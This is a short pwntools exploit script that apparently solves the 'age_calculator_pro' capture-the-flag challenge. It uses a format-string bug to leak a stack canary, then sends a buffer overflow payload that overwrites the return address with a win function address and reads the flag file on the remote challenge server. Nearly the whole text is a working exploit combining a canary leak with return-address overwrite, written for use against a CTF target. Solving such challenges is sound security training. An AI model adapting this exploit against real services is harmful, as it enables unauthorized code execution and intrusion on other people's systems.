from pwn import *

CAN_OFF = 17
OFF = 72
WIN = 0x4011f6

#conn = process('./age_calculator_pro')
conn = remote("agecalculatorpro.challs.olicyber.it", 38103)

fmt = "%{}$p".format(CAN_OFF).encode('ascii')
conn.sendlineafter(b"?\n", fmt)
canary = conn.recvline().decode().strip().split(",")[0]
canary = int(canary,16)

print("[*] Canary leaked: {}".format(hex(canary)))

payload = (b"A"*OFF) + p64(canary) + (b"\x00" * 8) + p64(WIN)
print("[*] Sending {} bytes payload to reach address: {}".format(len(payload), hex(WIN)))
conn.sendline(payload)
conn.sendline(b"cat flag")
flag = conn.recvlines(2)[1].decode()

print("[+] FLAG: {}".format(flag))

conn.close()